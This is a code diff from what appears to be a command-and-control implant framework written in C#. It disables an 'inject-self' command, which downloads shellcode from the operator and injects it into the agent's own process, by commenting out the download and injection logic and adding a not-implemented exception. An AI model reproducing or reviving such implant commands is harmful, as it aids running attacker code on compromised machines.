@@ -14,28 +14,29 @@ namespace Agent.Commands
     {
         public override string Name => "inject-self";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
+            throw new NotImplementedException();
             var fileName = task.FileId;
-            var fileContent = commm.Download(task.FileId, a =>
-            {
-                result.Info = $"Downloading {fileName} ({a}%)";
-                commm.SendResult(result);
-            }).Result;
+            //var fileContent = commm.Download(task.FileId, a =>
+            //{
+            //    result.Info = $"Downloading {fileName} ({a}%)";
+            //    commm.SendResult(result);
+            //}).Result;
 
-            this.Notify(result, commm, $"{fileName} Downloaded");
+            //this.Notify(result, commm, $"{fileName} Downloaded");
 
-            var shellcode = fileContent;
+            //var shellcode = fileContent;
 
-            var injectRes =  Injector.InjectSelfWithOutput(fileContent);
-            if(!injectRes.Succeed)
-                result.Result += $"Injection failed : {injectRes.Error}";
-            else
-            {
-                result.Result += $"Injection succeed!" + Environment.NewLine;
-                if (!string.IsNullOrEmpty(injectRes.Output))
-                    result.Result += injectRes.Output;
-            }
+            //var injectRes =  Injector.InjectSelfWithOutput(fileContent);
+            //if(!injectRes.Succeed)
+            //    result.Result += $"Injection failed : {injectRes.Error}";
+            //else
+            //{
+            //    result.Result += $"Injection succeed!" + Environment.NewLine;
+            //    if (!string.IsNullOrEmpty(injectRes.Output))
+            //        result.Result += injectRes.Output;
+            //}
         }
     }
 }
